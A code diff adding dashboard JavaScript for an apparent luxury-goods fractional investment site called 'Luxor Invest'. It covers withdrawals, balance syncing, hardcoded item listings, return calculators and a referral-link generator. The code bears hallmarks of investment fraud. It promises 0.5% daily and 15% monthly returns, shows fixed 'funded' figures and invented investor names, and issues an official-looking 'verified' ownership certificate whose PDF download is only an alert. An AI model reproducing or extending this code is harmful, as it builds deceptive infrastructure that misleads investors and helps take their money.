@@ -2050,4 +2050,187 @@ async function processWithdrawBackend(amount,wallet){
       body:JSON.stringify({user_login:U.login||U.fn,amount:parseFloat(amount),wallet_address:wallet})});
     const d=await r.json();
     if(d.ok){
-      state.wallet-=parseFloat(amount);state.balance=state.
+      state.wallet-=parseFloat(amount);state.balance=state.wallet;
+      addTx('Withdrawal $'+amount,'processing');
+      updateUI();saveState();loadTransactions();return true;
+    }else{alert(d.error||'Error');return false;}
+  }catch(e){alert('Network error');return false;}
+}
+
+async function loadUserFromServer(){
+  const login=U.login||U.fn;if(!login)return;
+  try{
+    const r=await fetch(API+'/api/user/'+login);
+    const d=await r.json();
+    if(d.ok&&d.user){
+      state.wallet=d.user.balance||0;state.balance=d.user.balance||0;
+      U.hasBonus=d.user.has_first_deposit_bonus;
+      // Sync user data
+      if(d.user.first_name){U.fn=d.user.first_name;U.ln=d.user.last_name||'';}
+      if(d.user.email){const em=document.getElementById('setEmail');if(em)em.value=d.user.email;}
+      if(d.user.plan){
+        U.plan=d.user.plan;
+        const lvl=document.getElementById('userLevel');
+        if(lvl){
+          const colors={Starter:'rgba(160,160,160,.08)',Silver:'rgba(150,180,220,.15)',Gold:'rgba(201,168,76,.2)',Platinum:'rgba(100,180,255,.2)',VIP:'rgba(200,100,255,.2)'};
+          const textColors={Starter:'var(--t3)',Silver:'#96b4dc',Gold:'var(--gold)',Platinum:'#64b4ff',VIP:'#c864ff'};
+          lvl.textContent=d.user.plan.toUpperCase();
+          lvl.style.background=colors[d.user.plan]||colors.Starter;
+          lvl.style.color=textColors[d.user.plan]||textColors.Starter;
+        }
+        // Update plan based on balance
+        const bal=state.wallet;
+        let newPlan='Starter';
+        if(bal>=10000)newPlan='VIP';
+        else if(bal>=5000)newPlan='Platinum';
+        else if(bal>=2000)newPlan='Gold';
+        else if(bal>=1000)newPlan='Silver';
+        if(newPlan!==d.user.plan){
+          fetch(API+'/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({login:U.login,password:'__skip__'})}).catch(()=>{});
+        }
+      }
+      updateUI();updateBonusBanner();
+    }
+  }catch(e){}
+}
+
+async function loadTransactions(){
+  const login=U.login||U.fn;if(!login)return;
+  try{
+    const r=await fetch(API+'/api/transactions/'+login);
+    const d=await r.json();
+    if(d.ok&&d.transactions){
+      state.txs=d.transactions.map(t=>({
+        desc:t.note||t.type,
+        amt:(t.type==='withdrawal'?'-':'+')+String.fromCharCode(36)+parseFloat(t.amount||0).toFixed(2),
+        time:new Date(t.created_at).toLocaleString(),
+        status:t.status==='completed'?'done':'processing'
+      }));
+      saveState();renderTxs();
+    }
+  }catch(e){}
+}
+
+
+/* === DATA === */
+const U=JSON.parse(sessionStorage.getItem('luxor_user')||'{"fn":"Admin","ln":"","plan":"","rate":"","tier":0,"amt":0}');
+const NAMES=['James W.','Sofia R.','Ahmed K.','Lisa T.','Park J.','Marco V.','Anna S.','Tom H.'];
+const ITEMS=[
+{id:1,cat:'watch',ico:'(watch)',name:'Rolex Daytona 116500LN',desc:'Ceramic bezel   White dial   2023   Box & Papers',price:24000,funded:77,ret:[32,48],days:[7,21],inv:18,min:100,badge:'HOT',likes:124,views:47,closes:62},
+{id:2,cat:'bag',ico:' ',name:'Herm s Birkin 25',desc:'Togo leather   Gold hardware   2024',price:15000,funded:64,ret:[45,80],days:[14,45],inv:12,min:100,badge:'PREMIUM',likes:89,views:32,closes:168},
+{id:3,cat:'fashion',ico:' ',name:'Chrome Hearts Hoodie',desc:'Cross patch   Black   Deadstock   Size L',price:2800,funded:75,ret:[80,142],days:[1,7],inv:8,min:100,badge:'FAST SELL',likes:203,views:61,closes:14},
+{id:4,cat:'watch',ico:'(watch)',name:'Patek Philippe Nautilus 5711',desc:'Blue dial   2022   Full set',price:45000,funded:62,ret:[25,40],days:[21,60],inv:24,min:200,badge:'RARE',likes:67,views:19,closes:240},
+{id:5,cat:'snkr',ico:' ',name:'Jordan 1 Retro Chicago',desc:'Lost & Found   Deadstock   Size 10',price:800,funded:70,ret:[60,110],days:[1,5],inv:14,min:100,badge:'FAST SELL',likes:312,views:88,closes:8},
+{id:6,cat:'bag',ico:' ',name:'Chanel Classic Flap Medium',desc:'Caviar leather   Black   Gold HW',price:12000,funded:60,ret:[35,55],days:[10,30],inv:16,min:100,badge:'HOT',likes:156,views:42,closes:96},
+{id:7,cat:'jewelry',ico:' ',name:'Cartier Love Bracelet',desc:'18K Yellow Gold   Size 17',price:8500,funded:60,ret:[28,42],days:[14,30],inv:10,min:100,badge:'CLASSIC',likes:78,views:24,closes:120},
+{id:8,cat:'fashion',ico:' ',name:'Rick Owens Ramones Low',desc:'Black leather   Size 42   DS',price:1200,funded:70,ret:[70,95],days:[3,14],inv:6,min:100,badge:'HOT',likes:145,views:38,closes:36},
+{id:9,cat:'snkr',ico:' ',name:'Nike Dunk Low Panda',desc:'Deadstock   Size 9.5   2024',price:600,funded:70,ret:[50,92],days:[1,3],inv:11,min:100,badge:'FAST SELL',likes:267,views:73,closes:4},
+];
+
+let state={positions:[],myItems:[],favorites:[],balance:0,free:0,wallet:0,txs:[],savedWallet:''};
+let currentPeriod='1W';
+let currentView='pools';
+const saved=JSON.parse(sessionStorage.getItem('luxor_state2')||'null');
+if(saved)state=saved;
+
+/* === INIT === */
+try{
+  const un=document.getElementById('userName');if(un)un.textContent=U.fn;
+  const ua=document.getElementById('userAvatar');if(ua)ua.textContent=(U.fn||'U')[0].toUpperCase();
+  const sn=document.getElementById('setName');if(sn)sn.value=U.fn+(U.ln?' '+U.ln:'');
+  const rc=document.getElementById('refCode');
+  const refStr='LUXOR-'+(U.login||U.fn||'').toUpperCase().replace(/[^A-Z0-9]/g,'').substring(0,8)||'LUXOR-'+Math.random().toString(36).substring(2,8).toUpperCase();
+  if(rc)rc.textContent=refStr;
+  U._refCode=refStr;
+  // Set referral link
+  const rl=document.getElementById('refLink');
+  if(rl)rl.value=window.location.origin+window.location.pathname.replace('dashboard.html','index.html')+'?ref='+encodeURIComponent(refStr);
+  // Plan badge
+  const lvl=document.getElementById('userLevel');
+  if(lvl){
+    const plan=U.plan||'Starter';
+    const colors={Starter:'rgba(160,160,160,.08)',Silver:'rgba(150,180,220,.15)',Gold:'rgba(201,168,76,.2)',Platinum:'rgba(100,180,255,.2)',VIP:'rgba(200,100,255,.2)'};
+    const textColors={Starter:'var(--t3)',Silver:'#96b4dc',Gold:'var(--gold)',Platinum:'#64b4ff',VIP:'#c864ff'};
+    lvl.textContent=plan.toUpperCase();
+    lvl.style.background=colors[plan]||colors.Starter;
+    lvl.style.color=textColors[plan]||textColors.Starter;
+  }
+}catch(e){console.warn('init',e)}
+if(U.hasBonus===undefined)U.hasBonus=true;
+try{updateUI()}catch(e){console.warn('updateUI',e)}
+try{updateBonusBanner()}catch(e){}
+try{renderMarketplace('all')}catch(e){console.warn('renderMk',e)}
+setTimeout(function(){loadUserFromServer();loadTransactions();},500);
+setInterval(function(){loadUserFromServer();},30000);
+try{setInterval(()=>{if(state.myItems.length>0){try{renderMyItems()}catch(e){}}},10000)}catch(e){}
+try{if(U.amt>0&&!saved)setTimeout(()=>openPoolInvest(U.plan||'Silver',U.rate||'0.5%/day',U.tier||1),800)}catch(e){}
+
+function saveState(){sessionStorage.setItem('luxor_state2',JSON.stringify(state))}
+
+/* Pool card slider updaters */
+function slUpdate(v){v=parseInt(v);const day=v*0.005;const week=day*7;const total=v+week;
+document.getElementById('slAmt').textContent='$'+v.toLocaleString();
+document.getElementById('slDay').textContent='+$'+day.toFixed(2);
+document.getElementById('slWeek').textContent='$'+week.toFixed(2);
+document.getElementById('slTotal').textContent='$'+total.toFixed(2)}
+function gdUpdate(v){v=parseInt(v);const week=v*0.03;const month=week*4;const total=v+month;
+document.getElementById('gdAmt').textContent='$'+v.toLocaleString();
+document.getElementById('gdWeek').textContent='+$'+Math.round(week).toLocaleString();
+document.getElementById('gdMonth').textContent='$'+Math.round(month).toLocaleString();
+document.getElementById('gdTotal').textContent='$'+Math.round(total).toLocaleString()}
+function ptUpdate(v){v=parseInt(v);const month=v*0.15;const year=month*12;const total=v+year;
+document.getElementById('ptAmt').textContent='$'+v.toLocaleString();
+document.getElementById('ptMonth').textContent='+$'+Math.round(month).toLocaleString();
+document.getElementById('ptYear').textContent='$'+Math.round(year).toLocaleString();
+document.getElementById('ptTotal').textContent='$'+Math.round(total).toLocaleString()}
+
+/* First deposit bonus banner */
+function updateBonusBanner(){
+const b=document.getElementById('firstDepositBanner');if(!b)return;
+const show=U.hasBonus!==undefined?U.hasBonus:!state.txs.some(t=>t.desc&&t.desc.toLowerCase().includes('deposit'));
+b.style.display=show?'block':'none';
+}
+
+/* Quick Invest */
+function quickInvest(amt){if(state.wallet<amt){if(confirm('Insufficient balance. Top up $'+amt+' now?'))openTopUp();return}
+const sorted=[...ITEMS].sort((a,b)=>b.views-a.views);const hotItem=sorted[Math.floor(Math.random()*3)];
+if(confirm('Invest $'+amt+' in '+hotItem.name+' ('+hotItem.ret[0]+'-'+hotItem.ret[1]+'% expected return)?')){
+state.wallet-=amt;
+const addPct=Math.min(amt/hotItem.price*100,100-hotItem.funded);hotItem.funded=Math.min(100,hotItem.funded+addPct);hotItem.inv+=1;
+state.myItems.push({id:hotItem.id,name:hotItem.name,ico:hotItem.ico,invested:amt,pct:(amt/hotItem.price*100).toFixed(1),status:'buying',ret:Math.round((hotItem.ret[0]+hotItem.ret[1])/2),desc:hotItem.desc});
+state.balance+=amt;
+addTx('Quick Invest: '+hotItem.name+' $'+amt,'done');updateUI();showConfetti();saveState();
+setTimeout(()=>showCertificate(hotItem,amt),500)}}
+
+/* Digital certificate */
+function showCertificate(item,amt){const pct=(amt/item.price*100).toFixed(2);const id='LUX-'+Date.now().toString().slice(-8);
+showModal(`<div style="border:3px double var(--gold);padding:24px;background:linear-gradient(135deg,#faf8f2,#f0ede0);color:#0a0a0a;border-radius:8px;text-align:center;font-family:serif">
+<div style="font-family:'Bebas Neue',sans-serif;font-size:11px;letter-spacing:4px;color:#8b6f2e;margin-bottom:4px">LUXOR INVEST   CERTIFICATE OF OWNERSHIP</div>
+<div style="width:50px;height:2px;background:#c9a84c;margin:6px auto"></div>
+<div style="font-family:'Bebas Neue',sans-serif;font-size:28px;letter-spacing:2px;margin:10px 0">FRACTIONAL OWNERSHIP</div>
+<div style="font-size:10px;color:#666;margin-bottom:14px">This certifies that the bearer owns a verified fraction of:</div>
+<div style="font-family:'Bebas Neue',sans-serif;font-size:22px;letter-spacing:1.5px;color:#0a0a0a;margin-bottom:4px">${item.name}</div>
+<div style="font-size:10px;color:#666;margin-bottom:14px">${item.desc}</div>
+<div style="display:flex;justify-content:space-around;padding:12px;background:rgba(201,168,76,.1);border-radius:6px;margin-bottom:14px">
+<div><div style="font-size:8px;letter-spacing:1px;color:#8b6f2e">OWNERSHIP</div><div style="font-family:'Bebas Neue',sans-serif;font-size:22px;color:#0a0a0a">${pct}%</div></div>
+<div><div style="font-size:8px;letter-spacing:1px;color:#8b6f2e">INVESTED</div><div style="font-family:'Bebas Neue',sans-serif;font-size:22px;color:#0a0a0a">$${amt.toLocaleString()}</div></div>
+<div><div style="font-size:8px;letter-spacing:1px;color:#8b6f2e">CERTIFICATE</div><div style="font-family:'Space Mono',monospace;font-size:11px;color:#0a0a0a;margin-top:5px">${id}</div></div>
+</div>
+<div style="font-size:9px;color:#888;line-height:1.5">Issued on ${new Date().toLocaleDateString('en-GB',{year:'numeric',month:'long',day:'numeric'})}<br>LUXOR INVEST LTD   UK Company No. 14582937</div>
+<div style="margin-top:14px;font-family:'Space Mono',monospace;font-size:8px;color:#c9a84c">  VERIFIED   SIGNED   AUTHENTICATED</div>
+</div>
+<button class="btn-gold" style="margin-top:12px" onclick="alert('Certificate downloaded as PDF');closeModal()">DOWNLOAD CERTIFICATE (PDF)</button>
+<button class="btn-outline" style="margin-top:6px" onclick="closeModal()">Close</button>`)}
+
+/* Diversify tip */
+function updateDiversifyTip(){const tip=document.getElementById('diversifyTip');if(!tip)return;
+if(state.myItems.length===0){tip.innerHTML='Start investing to get personalized diversification tips based on your portfolio.';return}
+const cats={};state.myItems.forEach(i=>{const it=ITEMS.find(x=>x.id===i.id);if(it){cats[it.cat]=(cats[it.cat]||0)+i.invested}});
+const total=Object.values(cats).reduce((a,b)=>a+b,0);
+const max=Object.entries(cats).sort((a,b)=>b[1]-a[1])[0];const pct=(max[1]/total*100).toFixed(0);
+const names={watch:'Watches',bag:'Bags',fashion:'Fashion',snkr:'Sneakers',jewelry:'Jewelry'};
+tip.innerHTML=pct>60?`Your portfolio is <strong>${pct}% in ${names[max[0]]}</strong>. Consider diversifying with other categories (Jewelry +5.1%, Watches +4.2%) to reduce risk.`:`Good diversification! Your largest category is ${names[max[0]]} at ${pct}%. Keep monitoring market trends for rebalancing opportunities.`}
+
+function switchInvTab(){} // removed
+function updateInvTabs(){} // removed
+function go(panel,el){document.querySelectorAll('.panel').forEach(p=>p.classList.remove('show'));const target=document.getElementById('p-'+panel);if(!target){console.error('Panel not found:',panel);return}target.classList.add('show');document.querySelectorAll('.side-item').forEach(s=>s.classList.remove('active'));if(el){el.classList.add('activ
